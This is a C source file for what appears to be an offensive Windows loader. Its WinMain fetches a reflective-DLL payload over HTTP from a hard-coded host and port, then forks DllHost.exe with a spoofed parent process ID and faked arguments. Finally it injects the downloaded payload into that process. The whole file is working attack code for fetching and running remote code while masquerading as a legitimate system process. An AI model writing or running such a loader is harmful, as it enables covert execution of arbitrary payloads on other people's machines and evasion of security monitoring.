#include <windows.h>
#include <Common.h>
#include <Core/Fork.h>
#include <Core/Win32.h>
#include <Core/Exec.h>
#include <Core/TransportHttp.h>
#include <stdio.h>


PINSTANCE Instance = { 0 };

int WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd ){

    PWSTR    wHost    = L"192.168.0.101";
    int      Port     = 5555;
    PWSTR    wPath    = L"/calc.bin";
    
    PBYTE    bFile    = NULL;
    DWORD    sFile    = 0x00;

    PWSTR    Spawto   = L"\\??\\C:\\Windows\\system32\\DllHost.exe";
    PWSTR    LegitArg = L"C:\\Windows\\system32\\DllHost.exe";
    PCHAR    FakeArg  = NULL; //"C:\\Windows\\system32\\DllHost.exe /Processid:{17696EAC-9568-4CF5-BB8C-82515AAD6C09}";
    DWORD    PPid     = 11528;
    DWORD    Pid      = 0x00;
    HANDLE   hProcess = NULL;
    HANDLE   hThread  = NULL;

    DEBUG("[I] Initializing Instance Structure...\n", "");

    InitInstance( &Instance );

    wprintf(L"[I] Instance Initialized\n[I] Getting RDI via Http\n\t- Host: %ls\n\t- Port: %d\n\t- Path: %ls\n", wHost, Port, wPath);

    GetRDI( wHost, Port, wPath, &bFile, &sFile );

    DEBUG("[I] RDI file sizeof: %d\n", sFile);

    if ( !CreateFork( Spawto, LegitArg, FakeArg, PPid, &Pid, &hProcess, &hThread ) ){
        return -1;
    }

    DEBUG("[I] Fork Created...\n[I] Injecting RDI in Fork Process...\n", "");

    if ( !InjectRDI( hProcess, hThread, bFile, sFile ) ){
        return -1;
    }

    DEBUG("[I] RDI Injected :)\n", "");

    return 0;
}
